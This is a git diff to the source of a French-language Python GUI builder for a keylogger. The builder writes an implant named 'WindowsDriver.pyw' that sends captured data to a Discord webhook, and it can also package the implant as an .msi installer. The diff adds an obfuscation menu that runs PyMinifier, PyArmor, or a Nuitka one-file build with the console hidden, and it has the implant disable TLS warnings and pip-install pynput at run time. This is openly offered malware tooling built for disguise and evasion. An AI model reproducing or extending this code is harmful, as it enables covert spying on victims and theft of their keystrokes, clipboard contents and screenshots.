@@ -5,18 +5,15 @@ import customtkinter as ctk
 from tkinter import messagebox
 import requests
 import shutil
-import json
 import os
-from datetime import datetime
 import clipboard
-import threading
 from PIL import ImageGrab
 import io
-import cx_Freeze
 import platform
 import winreg
 import getpass
 import socket
+from colorama import Fore, Style
 
 ordi = platform.uname()
 
@@ -43,7 +40,7 @@ def valider_webhook():
 
 # Option choix du nom du keylogs
 nom_fichier = "WindowsDriver"
-temp_script = None  
+temp_script = "WindowsDriver.pyw" 
 
 def nom_keylogs():
     global nom_fichier, temp_script
@@ -211,28 +208,128 @@ def test_webhook():
     else:
         messagebox.showerror("Erreur", f"Le webhook Discord a échoué avec le code d'erreur : {envoyer.status_code}")
 
+
+# ---------------- Obfuscateur ----------------
+def obfuscateur():
+    messagebox.showinfo("Informations Obfuscateur", "Regardez le terminal pour les informations sur les obfuscateurs disponibles.")
+    print(f"""
+
+    {Fore.GREEN}
+    1. PyMinifier (simple à utiliser, mais moins sécurisé)
+
+       {Fore.YELLOW}Fonctionnalités :
+
+        Retire les espaces
+
+        Renomme les variables
+
+        Mini obfuscation facile 
+
+    {Fore.GREEN} 2. PyArmor (plus sécurisé, mais nécessite une installation supplémentaire)
+
+    {Fore.YELLOW}PyArmor est un outil qui protège ton code Python en le transformant en bytecode chiffré, impossible à lire ou comprendre.
+
+    Il sert à :
+
+    ✔️  protéger ton code source
+    ✔️  éviter qu’on te vole ton programme
+    ✔️  distribuer un logiciel sans exposer ton .py
+    ✔️  générer des versions protégées
+
+    Il ne transforme pas ton code en .exe,
+    mais il obfusque et chiffre le code Python.
+
+    {Fore.GREEN} 3. Nuitka (compilation en C pour une sécurité maximale)
+
+    {Fore.YELLOW}Nuitka est un compilateur Python → C + binaire natif.
+
+    Il prend un fichier Python (.py) et le transforme en :
+
+    code C (illisible et très dur à reverse-engineer)
+
+    puis exécutable (.exe, .bin, etc.)
+
+    👉 Contrairement à PyArmor, Nuitka NE laisse plus aucune trace de ton code Python.
+    👉 C’est la protection la plus forte disponible.\n\n
+    {Style.RESET_ALL}""")
+
+    try:
+        option = int(input("Choisissez un obfuscateur (1, 2 ou 3) : "))
+    except ValueError:
+        print("Option invalide. Veuillez entrer un nombre (1, 2 ou 3).")
+        return
+
+    while True:
+        if option == 1:
+            pyw()
+            pyminifier()
+        elif option == 2:
+            pyw()
+            pyarmor()
+        elif option == 3:
+            pyw()
+            nuitka()
+        else:
+            print("Option invalide. Veuillez choisir 1, 2 ou 3.")
+            input("Appuyez sur Entrée pour continuer...")
+            continue
+        
+        break
+
+
+def pyminifier():
+    global nom_fichier, temp_script
+    print("[INFO] Création du .pyw temporaire terminé. Lancement de PyMinifier...\n\n")
+    time.sleep(2)
+    try:
+        os.system("python -m pip install pyminifier")
+        cmd = f"pyminifier --obfuscate --outfile={nom_fichier}_obfu.pyw {temp_script}"
+        print(f"[INFO] Exécution : {cmd}")
+        os.system(cmd)
+        messagebox.showinfo("Fini", "Obfuscation PyMinifier terminée.")
+    except Exception as e:
+        messagebox.showerror("Erreur", f"PyMinifier a échoué : {e}")
+
+
+def pyarmor():
+    print("[INFO] Création du .pyw temporaire terminé. Lancement de PyArmor...\n\n")
+    time.sleep(2)
+    os.system("python -m pip install pyarmor==8.5.7")
+    print(f'\n\n[INFO] Installation de pyarmor fini . Lancement de l\'obfuscation avec pyarmor...\n\n')
+    os.system(f"pyarmor gen {temp_script}")
+
+def nuitka():
+    global nom_fichier, temp_script    
+    os.system("pip install nuitka")
+    os.system(f'nuitka --onefile --windows-disable-console --output-dir=. {temp_script}')
+
+
+
 # ---------------- BUILDER ----------------
 def lancer_programme():
 
     if switch.get() == 1:
-        pyw()
+        messagebox.showinfo(message="Vous allez générer uniquement le keyloger en .pyw qui fonctionnera dès l'execution")
+        
+        obfu_ask = messagebox.askyesno(
+            message="Voulez-vous chiffrer le code avec un obfuscateur ? (voir terminal pour les informations)"
+        )
+
+        if obfu_ask:
+            obfuscateur()
+        else:
+            pyw()
+
     else:
+        messagebox.showinfo(
+            message="Vous allez générer uniquement le keyloger en .msi (install officiel windows)..."
+        )
         msi()
-
-
-
 
 
 def pyw():
     global nom_fichier
     global temp_script
-
-    messagebox.showinfo(message="Vous allez générer uniquement le keyloger en .pyw qui fonctionnera dès l'execution")
-
-    if nom_fichier.strip() == "":
-        messagebox.showerror("Erreur", "Nom du fichier vide")
-        return
-
 
     config = {
         "webhook": webhook_entry.get().strip(),
@@ -251,13 +348,22 @@ def pyw():
 
     # Fichier est maintenant écrit DANS le with open()
     with open(temp_script, "w", encoding="utf-8") as f:
+        if temp_script is None:
+            messagebox.showerror("Erreur", "temp_script est None ! nom_keylogs() n’a pas été appelé.")
+            return
+
         f.write(f"WEBHOOK = '{config['webhook']}'\n\n")
         f.write("OPTIONS = {\n")
         for option, valeur in config["options"].items():
             f.write(f"    '{option}': {valeur},\n")
         f.write("}\n\n")
 
-        f.write("os.system('pip install requests bs4 pynput pillow clipboard cx_Freeze')\n\n")
+        f.write("import os\n")
+
+        f.write("import urllib3\n")
+        f.write("urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n\n")
+
+        f.write("\nos.system('pip install requests bs4 pynput pillow clipboard cx_Freeze')\n\n")
 
         f.write("import threading\n\n")
 
